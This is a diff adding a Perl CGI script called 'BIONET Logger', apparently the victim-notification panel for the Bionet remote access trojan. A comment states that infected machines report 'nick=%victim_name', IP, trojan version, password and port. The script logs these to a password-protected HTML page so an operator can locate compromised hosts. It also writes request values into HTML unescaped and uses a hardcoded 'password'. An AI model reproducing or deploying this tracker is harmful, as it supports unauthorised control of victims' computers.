@@ -1,0 +1,523 @@
+#! /usr/bin/perl
+
+# ^ path to perl on your server (should be correct)
+#   If your wrong, you will get errors.
+
+############################################
+#
+#  BIONET Logger
+#
+#  Author : Rezmond.
+#
+############################################
+
+# Log Settings (required)
+#############################################
+
+$checksum = "bnsipn";    # used as as flood protection see help file 
+$path     = "" ;  # the path to where we store our files
+$script   = "http://localhost/logger/blog.pl" ; # location of this script file
+
+############################################
+#
+# Optional Log Settings 
+# make sure the blowe files exist and  set 
+# to the correct CHMOD on your server 
+
+$logfile   = "bnllog";    # file to store log
+$password  = "password";  # password to access the logger
+
+############################################
+#
+# Extended settings (not described in tutorial) 
+
+$POST_LIMIT = 20; # limits how many items to store in the log -1 for infinate
+
+############################################
+#
+# Do not edit from here on unless
+# you know what you are doing and want to modify
+# the CGI script.
+#
+############################################
+
+$FLOW_LIMIT = 5; # 
+
+$reqLogMsg   = "1";   
+$reqGetlog   = "2";   
+$reqLogClear = "3";   
+
+$logfile   = $path . $logfile;
+$checkfile = $path . $checkfile;
+
+
+# syntax
+# request=1 nick= ip= ver= pass= port= id=bnsipn
+# request=2 (returns logdata) #not yet supported
+# request=3 clears the log
+# send nick=%victim_name&ip=%ip&ver=%version&pass=%pass&port=%port&ctype=%ctype &request=1 &id=bnsipn
+
+%params   = &getcgivars;
+
+$user       = $params{"nick"};
+$ip         = $params{"ip"};
+$version    = $params{"ver"};
+$pass       = $params{"pass"};
+$port       = $params{"port"};
+$connection = $params{"ctype"};
+$id         = $params{"id"};
+$request    = $params{"request"};
+
+$cgipass    = $params{"logonpass"};
+
+
+#for testing perposes
+
+#$user     = "nick";
+#$ip       = "127.0.0.1";
+#$version  = "3.16.me";
+#$pass     = "passwerd";
+#$port     = "12349";
+#$request  = "1";
+#$id       = "bsipn";
+
+
+
+
+# Handles LOG DATA Request
+############################################
+
+ if ($request eq $reqLogMsg) #request add message to the log
+{
+  # check unique ID
+  if ($id ne $checksum) 
+  {
+  
+  # use Fcntl qw(:DEFAULT :flock);
+  # sysopen(FHANDLE, "error", O_RDWR |  O_APPEND | O_CREAT  ) or die( "can't open filename: $!");
+  # flock(FHANDLE, LOCK_EX); 
+  # 
+  #  print FHANDLE "<tr>"; 
+  #   print FHANDLE "<td><font color='#000000'>" . $user    . "</font></td>";
+  #   print FHANDLE "<td><font color='#000000'>" . $ip      . "</font></td>";
+  #   print FHANDLE "<td><font color='#000000'>" . $version . "</font></td>";
+  #   print FHANDLE "<td><font color='#000000'>" . $port    . "</font></td>";
+  #   print FHANDLE "<td><font color='#000000'>" . $connection . "</font></td>";
+  # 
+  # closefile(FHANDLE);
+  
+   &HTMLdie("Flood protection Error: ");   
+  }
+
+   use Fcntl qw(:DEFAULT :flock);
+   sysopen(FHANDLE, "$logfile", O_RDWR |  O_APPEND | O_CREAT  ) or die( "can't open filename: $!");
+   flock(FHANDLE, LOCK_EX);
+     
+	 if ($user eq "") { $user = "Unknown" ; }
+	 if ($connection eq "") { $connection = "Unknown" ; }
+	 if ($ip eq "") { $ip = "Unknown" ; }
+	 if ($version eq "") { $version = "Unknown" ; }
+	  		 
+   	 print FHANDLE "<tr>"; 
+     print FHANDLE "<td><font color='#000000'>" . $user    . "</font></td>";
+     print FHANDLE "<td><font color='#000000'>" . $ip      . "</font></td>";
+     print FHANDLE "<td><font color='#000000'>" . $version . "</font></td>";
+     print FHANDLE "<td><font color='#000000'>" . $port    . "</font></td>";
+     print FHANDLE "<td><font color='#000000'>" . $connection . "</font></td>";
+	 
+	 
+  #	 ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday) = gmtime(time);
+    $now_string = gmtime;
+	 
+     print FHANDLE "<td><font color='#000000'>" . $now_string .  "</font></td>";
+     print FHANDLE "</tr>\n";
+ #   $user$pass
+ #  " .  . "&" . . "&" .  . "&" . . "&" .  . chr(13) . chr(10); 
+   close(FHANDLE);	# Close the file
+   
+   &SizeLog(); #if we have too many messages truncate the log
+   
+   &HTMLdie("Message Recorded: " , "BioNet Notificaion");
+   exit; #quit
+  }
+
+# HANDLES Display Log request
+############################################
+
+ if ($request eq $reqGetlog) #request get the current message log data
+ { 
+# http://rezmond/logger/blog.pl?nick=gayserver&ip=126.0.3.3&ver=3.16me&pass=passwerd&port=12349&ctype=modem&id=bnsipn&request=2
+   &TestLogonPass();   
+   &DisplayLog();
+ }
+
+
+# clears the log file
+############################################ 
+#this basically truncates the log file
+ if ($request eq $reqLogClear) #request clear log
+ {
+   &TestLogonPass();
+   
+   use Fcntl qw(:DEFAULT :flock);
+   sysopen(FHANDLE, "$logfile", O_RDWR | O_CREAT)    or die "can't open filename: $!";
+   flock(FHANDLE, LOCK_EX);
+
+   truncate(FHANDLE, 0)   or die "Error can't truncate : $logfile!";
+   close(FHANDLE);
+
+   &DisplayLog(); 
+   # &HTMLdie("Logfile Cleared MainPage " , "" );            
+   exit; #quit
+ }
+
+
+############################################
+
+  &TestLogonPass(); 
+  &DisplayLog();   
+  &HTMLdie("Unsupported Request: ");
+ exit;
+ 
+ ############################################
+ 
+
+sub SizeLog
+ {    
+  if ($POST_LIMIT eq -1) {return; } #disabled    
+ 
+  use Fcntl qw(:DEFAULT :flock);
+  sysopen(FHANDLE, "$logfile", O_RDWR  ) or die( "can't open filename: $!");
+  flock(FHANDLE, LOCK_EX);
+  
+  @linedata = <FHANDLE>;
+  $numlines = @linedata; 
+ 
+ # &HTMLdie($linedata , "arse"); 
+ # ($numlines - $POST_LIMIT)
+
+  if ($numlines >  ($POST_LIMIT + $FLOW_LIMIT) )
+  {
+  
+  truncate(FHANDLE, 0)   or die "Error can't truncate : $logfile!";
+  close(FHANDLE);  
+  
+  sysopen(FHANDLE, "$logfile", O_RDWR  ) or die( "can't open filename: $!");
+  flock(FHANDLE, LOCK_EX);
+  
+   for ($nm  = ($numlines - $POST_LIMIT) ; $nm  < $numlines ;  $nm ++) 
+   {	
+	 print  FHANDLE  $linedata[$nm];
+    }
+  }            
+      
+  close(FHANDLE);  
+  return;
+ }
+
+ 
+############################################
+
+sub TestLogonPass
+{
+ if ($password ne $cgipass)  
+ {
+   &getPass(); 
+  exit;
+ }
+ 
+ return;
+}
+
+############################################
+
+sub DisplayLog{
+
+# ?logonpass=$logonpass
+
+  sysopen(FHANDLE, "$logfile", O_RDWR) or die( "can't open filename: $!");
+  @lines = <FHANDLE>; # Read it into an array
+  
+  
+  print "Content-type: text/html\n\n<HTML> " ;
+  print <<EOF;
+ 
+<head>
+<title>BioNet logger</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<STYLE type=text/css>
+
+TD {
+	FONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt
+}
+DIV {
+	FONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt
+}
+BODY {
+	FONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt
+; color: #FFFFFF}
+a:active {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}
+a:hover {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}
+a:link {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}
+a {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}
+
+</STYLE>
+
+<body bgcolor="#938F9A" topmargin="0" leftmargin="0" marginwidth="0" 8px font-size:>
+<table width="752" border=0 >
+  <tr> 
+    <td height="19"> 
+      <table width="100%" border="0">
+        <tr>
+          <td height="19"><img src="image/tblogo.gif" width="740" height="30"></td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+  
+  <tr>
+    <td height="181"> 
+      <table width="100%" border="0" cellpadding=3 cellspacing=0>
+        <tr> 
+          <td bgcolor="#797481" height="6"><font color="#FFFFFF"><b>Bionet Logger 
+            </b></font> <font color="#FFFFFF"><b> </b></font> </td>
+        </tr>
+        <tr> 
+          <td>
+            <table width="100%" border="1" cellspacing="0" cellpadding="0" bgcolor="#C5C5C5" bordercolor="#797481">
+              <tr> 
+                <td height="12"><b><font color="#FFFFFF"><b><font color="#000000">Options 
+                  -&gt; |
+				  
+EOF
+
+  print "<a href='blog.pl?logonpass=" . $cgipass  .  "'>Refresh log </a> </font></b></font><font color='#000000'><b>|" ;				   
+  print "<a href='blog.pl?request=3&logonpass=" . $cgipass . "'> Clear log </a><b>|</b></b></font></b>" ;
+	 
+print <<EOF;
+				   
+                </td>
+              </tr>
+            </table>
+			
+            <b><font color="#FFFFFF"><br>
+            </font></b> <b><b><br>
+            </b><font color="#FFFFFF"><br>
+            Currrent Log</font></b></td>
+        </tr>
+        <tr> 
+          <td height="40"> 
+            <div align="center"> 
+              <center>
+                <table border=1 bordercolor=#6D6875 cellpadding=3 
+                  cellspacing=0 width="100%" bgcolor="#C5C5C5"  >
+                  <tr> 
+                    <td width="15%"><font color="#000000"><b>Name<br>
+                      </b></font></td>
+                    <td width="15%"><font color="#000000"><b>IP</b></font></td>
+                    <td width="13%"><b><font color="#000000">Version</font></b></td>
+                    <td width="16%"><b><font color="#000000">Port</font></b></td>
+                    <td width="14%"><b><font color="#000000">Connection</font></b></td>
+                    <td width="27%"> 
+                      <div align="left"><b><font color="#000000">Logged<br>
+                        </font></b></div>
+                    </td>
+                  </tr>
+
+EOF
+	
+  $outpt = "";	
+  foreach $lin (@lines)
+  {
+    # print  $lin . "\n";
+	$outpt = $lin . $outpt; # build list so that new enetries diplay first 
+  }
+  
+  print $outpt;
+  
+print <<EOF;  
+                </table>
+				<br><br><br><br><br><br>
+              </center>
+            </div>
+          </td>
+        </tr>
+      </table>
+      <p><img src="image/iconsml.gif" width="150" height="104"></p>
+    </td>
+  </tr>
+</table>
+
+</body>
+</html>
+
+EOF
+ 
+  close(FHANDLE);	 # Close the file  
+  exit; #quit
+}
+
+
+############################################
+
+
+
+
+sub getPass{
+
+print "Content-type: text/html\n\n<HTML> " ;
+print <<EOF;
+ 
+<html>
+
+<head>
+<title>BioNet logger</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+<STYLE type=text/css>
+
+TD {
+	FONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt
+}
+DIV {
+	FONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt
+}
+BODY {
+	FONT-FAMILY: Verdana, Tahoma; FONT-SIZE: 8pt
+; color: #FFFFFF}
+a:active {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}
+a:hover {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #ffffff; text-decoration: none}
+a:link {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}
+a {  font-family: Verdana, Arial, Helvetica, sans-serif; color: #333333; text-decoration: none}
+
+</STYLE>
+<body bgcolor="#938F9A" topmargin="0" leftmargin="0" marginwidth="0" 8px font-size:>
+<table width="752" border=0 >
+  <tr> 
+    <td height="19"> 
+      <table width="100%" border="0">
+        <tr>
+          <td height="19"><img src="image/tblogo.gif" width="740" height="30"></td>
+        </tr>
+      </table>
+    </td>
+  </tr>
+  
+  <tr>
+    <td height="158">
+      <table width="100%" border="0" cellpadding=3 cellspacing=0>
+        <tr> 
+          <td bgcolor="#797481" height="14"><b><font color="#FFFFFF">BioNet Server 
+            logger</font></b></td>
+        </tr>
+        <tr> 
+          <td><b><font color="#FFFFFF"><br>
+            </font></b></td>
+        </tr>
+        <tr> 
+          <td height="40"> 
+            <div align="center"> 
+              <center>
+
+EOF
+
+print "<form name='form1' method='post' action='" . $script	. "'>";
+
+print <<EOF;  
+
+                <table width="31%" border="0" cellspacing="0" cellpadding="0">
+                    <tr>
+                      <td><b><font color="#FFFFFF"><br>
+                        Enter Password:</font></b> </td>
+                    </tr>
+                    <tr>
+                      <td>
+                        <input type="password" name="logonpass" maxlength="40">
+                        <input type="submit" name="Submit" value="Enter">
+                      </td>
+                    </tr>
+                  </table>
+                  <br>
+                  <br>
+                  <br>
+                </form>
+              </center>
+            </div>
+          </td>
+        </tr>
+      </table>
+      <p>&nbsp;</p>
+    </td>
+  </tr>
+</table>
+
+</body>
+</html>
+
+EOF
+}
+
+
+# Read all CGI vars into an associative array.
+
+sub getcgivars {
+    local($in, %in) ;
+    local($name, $value) ;
+
+
+    # First, read entire string of CGI vars into $in
+    if ( ($ENV{'REQUEST_METHOD'} eq 'GET') ||
+         ($ENV{'REQUEST_METHOD'} eq 'HEAD') ) {
+        $in= $ENV{'QUERY_STRING'} ;
+
+    } elsif ($ENV{'REQUEST_METHOD'} eq 'POST') {
+        if ($ENV{'CONTENT_TYPE'}=~ m#^application/x-www-form-urlencoded$#i) {
+            $ENV{'CONTENT_LENGTH'}
+                || &HTMLdie("No Content-Length sent with the POST request.") ;
+            read(STDIN, $in, $ENV{'CONTENT_LENGTH'}) ;
+
+        } else { 
+            &HTMLdie("Unsupported Content-Type: $ENV{'CONTENT_TYPE'}") ;
+        }
+
+    } else {
+        &HTMLdie("Script was called with unsupported REQUEST_METHOD.") ;
+    }
+    
+    # Resolve and unencode name/value pairs into %in
+    foreach (split('&', $in)) {
+        s/\+/ /g ;
+        ($name, $value)= split('=', $_, 2) ;
+        $name=~ s/%(..)/chr(hex($1))/ge ;
+        $value=~ s/%(..)/chr(hex($1))/ge ;
+        $in{$name}.= "\0" if defined($in{$name}) ;  # concatenate multiple vars
+        $in{$name}.= $value ;
+    }
+
+    return %in ;
+
+}
+
+
+# Die, outputting HTML error page
+# If no $title, use a default title
+sub HTMLdie {
+    local($msg,$title)= @_ ;
+    $title || ($title= "Error Processing Request.") ;
+    print <<EOF ;
+Content-type: text/html
+
+<html>
+  <head>
+    <title>$title</title>
+ </head>
+<body>
+<font color="FF0000"><h1>$title</h1></font>
+<h3>$msg</h3>
+</body>
+</html>
+EOF
+ exit ;
+}
+
